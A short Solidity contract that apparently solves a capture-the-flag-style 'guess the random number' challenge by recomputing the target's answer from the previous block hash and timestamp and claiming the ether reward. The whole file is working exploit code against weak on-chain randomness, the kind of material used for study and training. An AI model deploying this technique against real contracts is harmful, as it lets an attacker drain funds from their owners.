pragma solidity ^0.4.21;

interface IChallenge {
    function guess(uint8 n) external payable;
}

contract ExploitGuessTheRandomNumber {
    function attack(address target) public payable {
        require(msg.value == 1 ether, "Need exactly 1 ether to play");

        // Recompute the answer using same logic as the challenge
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        // Call the challenge contract with correct guess
        IChallenge(target).guess.value(1 ether)(answer);
    }

    // Fallback function to receive the 2 ether reward
    function() external payable {}
}

